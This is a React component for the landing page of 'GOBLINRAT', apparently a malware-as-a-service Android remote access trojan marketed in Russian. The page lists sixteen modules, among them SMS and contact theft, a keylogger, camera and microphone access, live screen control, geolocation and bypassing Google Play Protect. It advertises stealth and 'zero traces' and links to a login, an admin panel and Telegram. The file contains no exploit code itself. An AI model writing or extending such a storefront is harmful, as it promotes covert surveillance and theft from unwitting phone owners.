import { useNavigate } from 'react-router-dom';
import { useSettings } from '../settings.jsx';
import AsciiText from '../AsciiText.jsx';
import RainCanvas from '../RainCanvas.jsx';
import Footer from '../components/Footer.jsx';
import useReveal from '../useReveal.js';
import { getToken } from '../api.js';

const MODULES = [
  'Управление файловой системой',
  'Получение SMS и контактов',
  'Информация об устройстве',
  'Логи активности на экране',
  'Просмотр экрана в реальном времени',
  'Удалённое управление экраном',
  'Доступ к камере и микрофону',
  'Кейлоггер',
  'Мониторинг уведомлений',
  'Геолокация',
  'Выполнение команд через консоль',
  'Выключение экрана',
  'Блокировка кнопок устройства',
  'Работа со звонками при поддержке устройства',
  'Создание кастомных билдов через админ-панель',
  'Обход Google Play Protect и защитных механизмов Android'
];

const STATS = [
  { n: '16', l: 'MODULES' },
  { n: '24/7', l: 'STEALTH' },
  { n: '<50ms', l: 'LATENCY' },
  { n: '0', l: 'TRACES' }
];

export default function Landing() {
  const nav = useNavigate();
  const { s } = useSettings();
  const r1 = useReveal();
  const r2 = useReveal(0.08);
  const r3 = useReveal(0.2);

  return (
    <div className="page landing">
      <RainCanvas />

      <header className="topbar">
        <div className="logo">
          <span className="logo-bracket">[</span> {s.site_title || 'GOBLINRAT'} <span className="logo-bracket">]</span>
        </div>
        <nav className="topnav">
          <a href="#modules" className="tlink">MODULES_01</a>
          <a href="#stats" className="tlink">STATS_02</a>
          {getToken()
            ? <button className="btn btn-ghost" onClick={() => nav('/admin')}>ПАНЕЛЬ →</button>
            : <button className="btn btn-solid" onClick={() => nav('/login')}>ВОЙТИ ↗</button>}
        </nav>
      </header>

      <section className="hero">
        <div className="hero-tag">// GOBLINRAT ACCESS TERMINAL v2.6 — вы подключены</div>

        <AsciiText text={s.ascii_text} />

        <div className="hero-sub">
          андроид-ратник полного цикла. {MODULES.length} модулей — от SMS до обхода защит.
        </div>

        <div className="hero-cta">
          <button className="btn btn-solid btn-lg" onClick={() => nav('/login')}>
            &gt;_ НАЧАТЬ
          </button>
          <a className="btn btn-ghost btn-lg" href={s.tg_url || '#'} target="_blank" rel="noreferrer">
            TELEGRAM ↗
          </a>
        </div>

        <div className="hero-hint"><span className="cursor">█</span></div>
      </section>

      <section id="modules" ref={r1} className="funcs-section">
        <div className="sec-head">
          <span className="sec-title">&gt; MODULES</span>
          <span className="sec-sub">// {MODULES.length} онлайн</span>
        </div>
        <div className="funcs">
          {MODULES.map((m, i) => (
            <div key={i} className="func-card">
              <div className="func-k">//{String(i + 1).padStart(2, '0')}</div>
              <div className="func-t">{m}</div>
            </div>
          ))}
        </div>
      </section>

      <section id="stats" ref={r2} className="stats">
        {STATS.map(st => (
          <div key={st.l} className="stat">
            <div className="stat-n">{st.n}</div>
            <div className="stat-l">{st.l}</div>
          </div>
        ))}
      </section>

      <section ref={r3} className="cta">
        <pre className="cta-ascii">// READY? goblin ./build --module all --stealth</pre>
        <button className="btn btn-solid btn-lg" onClick={() => nav('/login')}>
          GET ACCESS →
        </button>
      </section>

      <Footer />
    </div>
  );
}
